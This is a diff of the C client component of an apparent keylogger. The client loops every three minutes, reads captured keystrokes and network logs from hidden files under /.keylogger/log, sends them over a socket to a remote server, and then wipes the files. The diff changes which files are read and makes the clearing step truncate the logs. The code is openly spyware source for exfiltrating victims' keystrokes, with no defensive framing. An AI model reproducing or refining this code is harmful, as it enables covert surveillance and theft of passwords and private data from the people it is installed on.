@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include  <fcntl.h>
+
 #include "client.h"
 
 #define BUFFER_SIZE 4096
@@ -8,7 +8,8 @@
 void start_client(void)
 {
     // Variables
-    int sock, ret;
+    int sock;
+    int ret =0;
     struct sockaddr_in server;
     char send_buffer[BUFFER_SIZE];
     
@@ -36,40 +37,38 @@ void start_client(void)
     }
     printf("Connecting to server...\n");
     
-    while(1)
-    {
+    while(1){
         sleep(180); // wait 180sec = 3 min before sending logs again
         
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
-        FILE *keylog_log = fopen("/.keylogger/log/keylog_received.txt", "r");
+        FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "r");
         /*Write keylog file*/
         while(fscanf(keylog_log,"%s",send_buffer) != EOF)
         {
-            if(ret = write(sock, send_buffer, sizeof(send_buffer))<=0){
+            if(ret == (write(sock, send_buffer, sizeof(send_buffer))<=0)){
                 perror("Error writing keylog log\n");
                 close(sock);
                 exit(0);
             }
         }
         /*Clear and close keylog file*/
-        fclose(fopen("/.keylogger/log/keylog.txt", "a"));
-        sleep(5);
-               
-        memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
-        /*Open network_log file for writing*/
-        FILE *network_log = fopen("/.keylogger/log/network_received.txt", "r");
-        /*Write keylog file*/
-        while(fscanf(network_log,"%s",send_buffer) != EOF)
-        {
-            if(ret = (write(sock, send_buffer, sizeof(send_buffer))<=0)){
-                perror("Error writing network log\n");
-                close(sock);
-                exit(0);
-            }
-        }
-        /*Clear and close keylog file*/
-        fclose(fopen("/.keylogger/log/network.txt", "a"));
+        fclose(fopen("/.keylogger/log/keylog.txt", "w"));
+       sleep(5);
+       memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
+       /*Open network_log file for writing*/
+       FILE *network_log = fopen("/.keylogger/log/network.txt", "r");
+       /*Write keylog file*/
+       while(fscanf(network_log,"%s",send_buffer) != EOF)
+       {
+           if(ret == (write(sock, send_buffer, sizeof(send_buffer))<=0)){
+               perror("Error writing network log\n");
+               close(sock);
+               exit(0);
+           }
+       }
+       /*Clear and close keylog file*/
+       fclose(fopen("/.keylogger/log/network.txt", "w"));
     }
     close(sock);
 }
